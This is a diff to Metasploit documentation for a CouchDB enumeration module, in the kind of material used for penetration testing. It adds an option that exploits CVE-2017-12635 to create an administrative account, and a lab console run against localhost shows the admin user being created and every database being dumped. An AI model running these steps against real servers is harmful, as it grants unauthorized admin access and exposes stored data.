@@ -3,7 +3,7 @@
 Apache CouchDB is a nosql database server which communicates over HTTP.  This module will enumerate the server and databases hosted on it.
 
 The following was done on Ubuntu 16.04, and is largely base on [1and1.com](https://www.1and1.com/cloud-community/learn/database/couchdb/install-and-use-couchdb-on-ubuntu-1604/):
-  
+
   1. `sudo apt install software-properties-common`
   2. `sudo add-apt-repository ppa:couchdb/stable`
   3. `sudo apt update`
@@ -20,54 +20,77 @@ The following was done on Ubuntu 16.04, and is largely base on [1and1.com](https
 
 ## Options
 
-  **serverinfo**
+  **SERVERINFO**
 
-  If set to true, the server info will also enumerated and set in msf's DB.  Defaults to `false`
+  If set to `true`, the server info will also enumerated and set in msf's DB.  Defaults to `false`.
+
+  **CREATEUSER**
+
+  If set to `true`, the server info will attempt to create an account in CouchDB using configured credentials (limited to CVE-2017-12635 conditions). Defaults to `false`.
 
 ## Scenarios
 
-  A run against the configuration from these docs
+Dumping databases with `SERVERINFO` and `CREATEUSER` set:
 
-  ```
-  msf5 auxiliary(scanner/afp/afp_login) > use auxiliary/scanner/couchdb/couchdb_enum 
-  msf5 auxiliary(scanner/couchdb/couchdb_enum) > set rhosts 1.1.1.1
-  rhosts => 1.1.1.1
-  msf5 auxiliary(scanner/couchdb/couchdb_enum) > set verbose true
-  verbose => true
-  msf5 auxiliary(scanner/couchdb/couchdb_enum) > run
-  
-  [+] 1.1.1.1:5984 {
-    "couchdb": "Welcome",
-    "uuid": "6f08e89795bd845efc6c2bf3d57799e5",
-    "version": "1.6.1",
-    "vendor": {
-      "version": "16.04",
-      "name": "Ubuntu"
-    }
+```
+msf5 > use auxiliary/scanner/couchdb/couchdb_enum
+msf5 auxiliary(scanner/couchdb/couchdb_enum) > options
+
+Module options (auxiliary/scanner/couchdb/couchdb_enum):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   CREATEUSER    false            yes       Create Administrative user
+   HttpPassword  IJvoGDWAWzQo     yes       CouchDB Password
+   HttpUsername  CQuXQnVwQAow     yes       CouchDB Username
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                         yes       The target address range or CIDR identifier
+   ROLES         _admin           yes       CouchDB Roles
+   RPORT         5984             yes       The target port (TCP)
+   SERVERINFO    false            yes       Print server info
+   SSL           false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI     /_all_dbs        yes       Path to list all the databases
+   VHOST                          no        HTTP server virtual host
+
+msf5 auxiliary(scanner/couchdb/couchdb_enum) > set rhosts 127.0.0.1
+rhosts => 127.0.0.1
+msf5 auxiliary(scanner/couchdb/couchdb_enum) > set serverinfo true
+serverinfo => true
+msf5 auxiliary(scanner/couchdb/couchdb_enum) > set createuser true
+createuser => true
+msf5 auxiliary(scanner/couchdb/couchdb_enum) > set verbose true
+verbose => true
+msf5 auxiliary(scanner/couchdb/couchdb_enum) > check
+
+[+] 127.0.0.1:5984 - Found CouchDB version 2.1.0
+[*] 127.0.0.1:5984 - The target appears to be vulnerable.
+msf5 auxiliary(scanner/couchdb/couchdb_enum) > run
+
+[+] 127.0.0.1:5984 - Found CouchDB version 2.1.0
+[+] 127.0.0.1:5984 - User CQuXQnVwQAow created with password IJvoGDWAWzQo. Connect to http://127.0.0.1:5984/_utils/ to login.
+[+] 127.0.0.1:5984 - {
+  "couchdb": "Welcome",
+  "version": "2.1.0",
+  "features": [
+    "scheduler"
+  ],
+  "vendor": {
+    "name": "The Apache Software Foundation"
   }
-  [*] #{peer} Enumerating Databases...
-  [+] 1.1.1.1:5984 Databases:
-  
-  [
-    "_replicator",
-    "_users"
-  ]
-  
-  [+] 1.1.1.1:5984 File saved in: /root/.msf4/loot/20180721105522_default_1.1.1.1_couchdb.enum_888970.bin
-  
-  msf5 auxiliary(scanner/couchdb/couchdb_enum) > services
-  Services
-  ========
-  
-  host           port  proto  name     state  info
-  ----           ----  -----  ----     -----  ----
-  1.1.1.1  5984  tcp    couchdb  open   HTTP/1.1 200 OK
-  Server: CouchDB/1.6.1 (Erlang OTP/18)
-  Date: Sat, 21 Jul 2018 14:54:45 GMT
-  Content-Type: text/plain; charset=utf-8
-  Content-Length: 127
-  Cache-Control: must-revalidate
-  
-  {"couchdb":"Welcome","uuid":"6f08e89795bd845efc6c2bf3d57799e5","version":"1.6.1","vendor":{"version":"16.04","name":"Ubuntu"}}
+}
+[*] 127.0.0.1:5984 - Enumerating Databases...
+[+] 127.0.0.1:5984 - Databases:
 
-  ```
+[
+  "_global_changes",
+  "_replicator",
+  "_users"
+]
+
+[+] 127.0.0.1:5984 - File saved in: /Users/wvu/.msf4/loot/20190107125002_default_127.0.0.1_couchdb.enum_790231.bin
+[+] 127.0.0.1:5984 - _global_changes saved in: /Users/wvu/.msf4/loot/20190107125002_default_127.0.0.1_couchdb._global__841794.bin
+[+] 127.0.0.1:5984 - _replicator saved in: /Users/wvu/.msf4/loot/20190107125002_default_127.0.0.1_couchdb._replica_022445.bin
+[+] 127.0.0.1:5984 - _users saved in: /Users/wvu/.msf4/loot/20190107125002_default_127.0.0.1_couchdb._users_671128.bin
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/couchdb/couchdb_enum) >
+```
